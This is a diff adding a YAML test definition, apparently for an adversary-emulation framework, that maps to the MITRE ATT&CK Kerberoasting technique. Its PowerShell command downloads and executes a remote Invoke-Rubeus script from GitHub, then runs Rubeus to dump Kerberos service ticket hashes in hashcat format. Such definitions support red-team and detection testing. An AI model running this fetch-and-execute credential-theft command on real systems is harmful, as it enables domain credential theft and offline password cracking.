@@ -1,0 +1,13 @@
+- id: e441b872-40c9-5b96-b72f-b68a5150a467
+  name: Soumaia ART Tests - WinPwn - PowerSharpPack - Kerberoasting Using Rubeus
+  description: PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn
+  tactic: credential-access
+  technique:
+    attack_id: T1558.003
+    name: 'Steal or Forge Kerberos Tickets: Kerberoasting'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
+          Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"
